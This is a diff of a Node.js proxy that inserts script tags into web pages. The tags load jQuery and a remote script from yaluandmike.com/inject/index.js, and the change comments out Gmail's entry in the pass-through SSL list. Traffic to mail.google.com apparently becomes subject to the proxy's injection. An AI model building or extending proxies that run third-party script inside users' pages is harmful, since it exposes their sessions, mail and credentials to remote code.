@@ -6,11 +6,11 @@ var http = require('http')
 
 var ADDITIONAL_CODE = {
     80: "<script type='text/javascript' src='http://ajax.googleapis.com/ajax/libs/jquery/1.7.1/jquery.min.js'></script>" +
-        "<script type='text/javascript'>$.noConflict();</script>" +
+        "<script type='text/javascript'>var $_jQuery = $.noConflict(true);</script>" +
         "<script type='text/javascript' src='http://www.yaluandmike.com/inject/index.js'></script>",
 
     443: "<script type='text/javascript' src='https://ajax.googleapis.com/ajax/libs/jquery/1.7.1/jquery.min.js'></script>" +
-        "<script type='text/javascript'>$.noConflict();</script>" +
+        "<script type='text/javascript'>var $_jQuery = $.noConflict(true);</script>" +
         "<script type='text/javascript' src='https://www.yaluandmike.com:446/inject/index.js'></script>"
 };
 
@@ -262,7 +262,7 @@ var directSsl = {
     'fbcdn-photos-a.akamaihd.net': 1,
     'pixel.facebook.com': 1,
     'view.atdmt.com': 1,
-    'mail.google.com': 1,
+   // 'mail.google.com': 1,
     'chatenabled.mail.google.com': 1
 };
 
